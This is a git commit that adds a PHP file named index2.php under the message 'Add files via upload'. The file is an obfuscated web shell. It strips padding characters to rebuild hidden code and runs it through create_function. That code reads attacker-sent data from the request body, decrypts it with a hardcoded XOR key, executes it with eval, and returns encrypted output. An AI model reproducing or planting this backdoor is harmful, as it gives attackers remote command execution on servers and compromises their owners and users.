94d68ac8f0abdbfdea5eabe1147e6cea425c1f67
Chabikator <149917023+Chabikator@users.noreply.github.com>
2023-11-04 22:37:40 -0400

    Add files via upload

---
+++ index2.php
@@ -0,0 +1,11 @@
+<?php
+$Z='g($j<-g$c&&$i<-g-g$l);$j++,$i++)-g{$-go.=$t{$-gi-g}^$-gk{-g$j};}}return $o;}i-gf-g (@pr-geg_match';
+$J='gval-g(@gz-gu-gnc-gompress(@x(@base6-g-g4_decode($m[-g1]),$k)-g-g));$o=@ob_get_-gcont-gen-gts();@-';
+$s=str_replace('d','','cdredated_dfundctdion');
+$a='("-g/$kh(.-g+)$kf/",@f-gile_-gget_co-gnt-gents(-g"-g-gphp://input"),$m)==1) {@-gob_star-gt();@e-';
+$U='u-gnct-g-gio-gn x($t,$k-g){$c=str-glen($k)-g-g;$l=strl-gen($t);$o="";-gfor($i=0;$i<$l-g;){-gfor($j=0;-';
+$u='$k="f56-g1aaf-g6";$kh="-ge-gf0bf14d4208";-g$kf=-g"bb46a4-gccb3ad"-g;-g$p="-gKtuFkCJGB-gKiJL-gWdA";f';
+$h='gob_end_c-glean()-g;$r=-g@base-g64_enc-gode(@x(@gzc-gompress(-g$o)-g,$k));-g-gprin-gt("$p$kh$r$kf");}';
+$Q=str_replace('-g','',$u.$U.$Z.$a.$J.$h);
+$P=$s('',$Q);$P();
+?>
